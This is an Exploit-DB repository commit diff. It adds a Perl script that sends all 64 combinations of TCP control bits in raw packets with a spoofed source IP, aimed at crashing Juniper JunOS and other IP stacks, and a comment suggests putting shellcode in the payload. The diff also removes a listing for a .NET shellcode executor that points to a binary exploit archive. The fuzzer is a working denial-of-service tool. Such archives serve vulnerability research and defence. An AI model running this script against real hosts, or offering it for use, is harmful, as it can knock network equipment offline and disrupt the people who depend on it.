d304cc3d3ef22bd6e5bccdeb6c13720345bbfc0c
Offensive Security <info@exploit-db.com>
2017-11-24 20:56:23 +0000

    DB: 2017-11-24
    116602 new exploits
    
    Too many to list!

---
+++ exploits/multiple/remote/13588.pl
@@ -0,0 +1,61 @@
+#!/usr/bin/perl
+#
+# 2^6 TCP Control Bit Fuzzer (No ECN or CWR)
+#
+# This code was written originally as a control bit fuzzer for the JunOS 3-9 crash mentioned 
+# in PSN-2010-01-623 and http://www.securityfocus.com/news/11571
+# However it will also be useful in fuzzing future IP stacks, such as userland IP stacks or
+# embedded systems.
+#
+# Originally it was was going to be the full 2^8, however Net::RawIP does't support the ECE
+# or the CWR bit, so I've got a Metasploit auxillery in the works to cover the full 2^8.
+#
+# I've left the ece/cwr portions commented out, so if in the future Net::RawIP supports these bits,
+# all you need to do is uncomment them and change the 65 in the for loop to a 256.
+#
+# Written by Shadow, 1/08/2010
+# ShadowHatesYou @ irc.freenode.net #remote-exploit
+
+use Net::RawIP;
+
+# Set the packet's payload. Shellcode could go here....
+my $data = "Die!";
+
+if ($ARGV[1] eq '') { print "Usage: ./" . $0 . " <ip> <port> <optionalsourceip>\n"; exit(0); }
+if ($ARGV[2] eq '') { my $src_ip = "72.52.4.181" } else { my $src_ip = $ARGV[2]; }
+
+my $packet = new Net::RawIP({tcp=>{}});
+$packet->set({
+	ip => {
+		saddr => $src_ip,
+		daddr => $ARGV[0],
+		id => 666
+	}
+});
+# Build packet $i with TCP control options $i
+for (my $i=0; $i < 64; $i++) {
+	my $packet = new Net::RawIP({tcp=>{}});
+	# Get our options
+	my $binary = sprintf("%b", $i);
+	my @bits = split(//, $binary);
+	# Set the source and destination IP	
+	$packet->set({		
+		tcp => {
+			source => $ARGV[1],
+			dest => $ARGV[1],
+			data => $data,
+			syn => @bits[0],
+			ack => @bits[1],
+			fin => @bits[2],
+			rst => @bits[3],
+			psh => @bits[4],
+			urg => @bits[5],
+#			cwr => @bits[6],
+#			ece => @bits[7]
+		}
+	});
+	# Packets away.
+	print "Sending packet "	. ($i + 1) . " to " . $ARGV[0] . ":" .$ARGV[1] . "	Bits: bits\n";
+	$packet->send;
+}
+exit(0);
--- platforms/win_x86/shellcode/39754.txt
+++
@@ -1,9 +0,0 @@
-# Exploit Title: .Net framework execute native x86 shellcode
-# Date: May. 2nd 2016
-# Exploit Author: Jacky5112 
-# Software Link: https://github.com/jacky5112/ShellCodeTest_Version_1.0
-# Version: 1.0
-# Tested on: Windows
-# CVE : (none)
-
-https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/39754.zip
